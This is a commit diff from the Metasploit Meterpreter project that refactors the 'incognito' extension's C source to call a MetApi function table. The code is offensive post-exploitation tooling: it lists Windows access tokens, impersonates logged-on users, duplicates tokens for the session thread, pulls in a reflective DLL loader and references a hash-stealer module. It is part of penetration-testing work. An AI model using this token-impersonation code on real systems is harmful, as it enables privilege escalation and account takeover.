472a6b1f9ea56688c1843707de81b79179645239
OJ <oj@buffered.io>
2020-04-17 19:49:46 +1000

    Move incognito to no more delay loading

--- c/meterpreter/source/extensions/incognito/incognito.c
+++ c/meterpreter/source/extensions/incognito/incognito.c
@@ -2,21 +2,19 @@
  * This module implements token manipulation features
  */
 #define _CRT_SECURE_NO_DEPRECATE 1
-#include "../../common/common.h"
+#include "common.h" 
+#include "common_metapi.h" 
 #include <psapi.h>
 #include "incognito.h"
 #include "token_info.h"
 #include "list_tokens.h"
 #include "user_management.h"
 #include "hash_stealer.h"
-#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
-// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
-// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
-// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
-#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
-// this sets the delay load hook function, see DelayLoadMetSrv.h
-EnableDelayLoadMetSrv();
+// Required so that use of the API works.
+MetApi* met_api = NULL;
+
+#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
 DWORD request_incognito_list_tokens(Remote *remote, Packet *packet);
 DWORD request_incognito_impersonate_user(Remote *remote, Packet *packet);
@@ -32,8 +30,8 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 	char *delegation_tokens = calloc(sizeof(char), BUF_SIZE);
 	char *impersonation_tokens = calloc(sizeof(char), BUF_SIZE);
 
-	Packet *response = packet_create_response(packet);
-	token_order = packet_get_tlv_value_uint(packet, TLV_TYPE_INCOGNITO_LIST_TOKENS_TOKEN_ORDER);
+	Packet *response = met_api->packet.create_response(packet);
+	token_order = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_INCOGNITO_LIST_TOKENS_TOKEN_ORDER);
 
 	dprintf("[INCOGNITO] Enumerating tokens");
 	// Enumerate tokens
@@ -42,7 +40,7 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 	if (!token_list)
 	{
 		dprintf("[INCOGNITO] Enumerating tokens failed with %u (%x)", GetLastError(), GetLastError());
-		packet_transmit_response(GetLastError(), remote, response);
+		met_api->packet.transmit_response(GetLastError(), remote, response);
 
 		free(uniq_tokens);
 		free(delegation_tokens);
@@ -76,7 +74,7 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 	if (uniq_tokens[i].delegation_available)
 	{
 		bTokensAvailable = TRUE;
-		char *username = wchar_to_utf8(uniq_tokens[i].username);
+		char *username = met_api->string.wchar_to_utf8(uniq_tokens[i].username);
 		if (username) {
 			strncat(delegation_tokens, username, BUF_SIZE - strlen(delegation_tokens) - 1);
 			strncat(delegation_tokens, "\n", BUF_SIZE - strlen(delegation_tokens) - 1);
@@ -96,7 +94,7 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 		if (!uniq_tokens[i].delegation_available && uniq_tokens[i].impersonation_available)
 		{
 			bTokensAvailable = TRUE;
-			char *username = wchar_to_utf8(uniq_tokens[i].username);
+			char *username = met_api->string.wchar_to_utf8(uniq_tokens[i].username);
 			if (username) {
 				strncat(impersonation_tokens, username, BUF_SIZE - strlen(impersonation_tokens) - 1);
 				strncat(impersonation_tokens, "\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
@@ -110,9 +108,9 @@ DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
 		strncat(impersonation_tokens, "No tokens available\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
 	}
 
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION, delegation_tokens);
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION, impersonation_tokens);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION, delegation_tokens);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION, impersonation_tokens);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	free(token_list);
 	free(uniq_tokens);
@@ -132,9 +130,9 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 	HANDLE xtoken;
 	TOKEN_PRIVS token_privs;
 
-	Packet *response = packet_create_response(packet);
-	char *impersonate_token = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
-	wchar_t *requested_username = utf8_to_wchar(impersonate_token);
+	Packet *response = met_api->packet.create_response(packet);
+	char *impersonate_token = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
+	wchar_t *requested_username = met_api->string.utf8_to_wchar(impersonate_token);
 
 	// Enumerate tokens
 	token_list = get_token_list(&num_tokens, &token_privs);
@@ -168,7 +166,7 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 				if (is_token(token_list[i].token, requested_username))
 				if (ImpersonateLoggedOnUser(token_list[i].token))
 				{
-					char *username = wchar_to_utf8(token_list[i].username);
+					char *username = met_api->string.wchar_to_utf8(token_list[i].username);
 					if (username) {
 						strncat(return_value, "[+] Successfully impersonated user ", sizeof(return_value)-strlen(return_value)-1);
 						strncat(return_value, username, sizeof(return_value)-strlen(return_value)-1);
@@ -177,7 +175,7 @@ DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
 						if (!DuplicateTokenEx(token_list[i].token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &xtoken)) {
 							dprintf("[INCOGNITO] Failed to duplicate token for %s (%u)", username, GetLastError());
 						} else {
-							core_update_thread_token(remote, xtoken);
+							met_api->thread.update_token(remote, xtoken);
 						}
 						free(username);
 					}
@@ -197,8 +195,8 @@ cleanup:
 	free(token_list);
 	free(uniq_tokens);
 
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	return ERROR_SUCCESS;
 }
@@ -216,14 +214,15 @@ Command customCommands[] =
 
 /*!
  * @brief Initialize the server extension.
+ * @param api Pointer to the Meterpreter API structure.
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
+DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
 {
-	hMetSrv = remote->met_srv;
+    met_api = api;
 
-	command_register_all( customCommands );
+	met_api->command.register_all( customCommands );
 
 	return ERROR_SUCCESS;
 }
@@ -235,7 +234,7 @@ DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
  */
 DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 {
-	command_deregister_all( customCommands );
+	met_api->command.deregister_all( customCommands );
 
 	return ERROR_SUCCESS;
 }
